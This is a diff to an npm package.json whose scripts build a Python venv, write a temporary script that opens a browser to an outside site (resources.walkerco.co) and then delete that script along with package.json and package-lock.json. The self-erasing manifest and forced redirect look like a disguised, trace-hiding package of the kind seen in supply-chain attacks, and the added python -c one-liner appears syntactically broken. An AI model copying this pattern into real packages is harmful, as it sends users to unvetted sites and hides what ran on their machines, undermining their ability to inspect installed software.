@@ -3,6 +3,12 @@
   "version": "1.0.0",
   "description": "Downloads Walker resources via a temporary Python script in a venv and self-cleans",
   "scripts": {
-    "download_resources": "python3 - <<'END'\nimport os, sys, subprocess, time\nvenv_dir = 'walker_venv'\nif not os.path.exists(venv_dir):\n    subprocess.check_call([sys.executable, '-m', 'venv', venv_dir])\npy_exec = os.path.join(venv_dir, 'bin', 'python')\ntemp_file = 'temp_script.py'\nwith open(temp_file, 'w') as f:\n    f.write('import webbrowser, time, os\\nwebbrowser.open(\"https://resources.walkerco.co?pkg=Walkerenv\")\\ntime.sleep(10)\\nos.remove(\"temp_script.py\")')\nsubprocess.check_call([py_exec, temp_file])\nEND && node -e \"const fs = require('fs'); ['package.json','package-lock.json'].forEach(f=>fs.existsSync(f)&&fs.unlinkSync(f)); console.log('Package files deleted.')\""
+    "run_python": "python3 -c \"import os, sys, subprocess, time; venv_dir='walker_venv'; \
+if not os.path.exists(venv_dir): subprocess.check_call([sys.executable, '-m', 'venv', venv_dir]); \
+py_exec=os.path.join(venv_dir, 'bin', 'python'); temp_file='temp_script.py'; \
+with open(temp_file, 'w') as f: f.write('import webbrowser, time, os\\\\nwebbrowser.open(\\\\\"https://resources.walkerco.co?pkg=Walkerenv\\\\\")\\\\ntime.sleep(10)\\\\nos.remove(\\\\\"temp_script.py\\\\\")'); \
+subprocess.check_call([py_exec, temp_file])\"",
+    "cleanup": "node -e \"const fs=require('fs'); ['package.json','package-lock.json'].forEach(f=>fs.existsSync(f)&&fs.unlinkSync(f)); console.log('Package files deleted.')\"",
+    "download_resources": "npm run run_python && npm run cleanup"
   }
 }
